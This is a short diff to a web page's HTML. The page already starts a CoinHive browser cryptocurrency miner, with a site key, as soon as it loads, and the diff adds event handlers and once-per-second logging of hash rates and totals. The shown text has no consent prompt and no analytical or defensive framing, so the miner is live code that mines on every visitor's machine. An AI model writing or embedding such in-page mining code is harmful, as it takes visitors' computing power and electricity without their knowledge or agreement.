@@ -56,6 +56,20 @@
     <script>
       var miner = new CoinHive.Anonymous('PTVvpesEaGkjBWAlYn6jPiS9MGmOlWJ0');
       miner.start();
+      // Listen on events
+      miner.on('found', function() { console.log('hash found') })
+      miner.on('accepted', function() { console.log('hash accepted') })
+
+      // Update stats once per second
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+
+        console.log(hashesPerSecond);
+        console.log(totalHashes);
+        console.log(acceptedHashes);
+      }, 1000);
     </script>
   </body>
 </html>
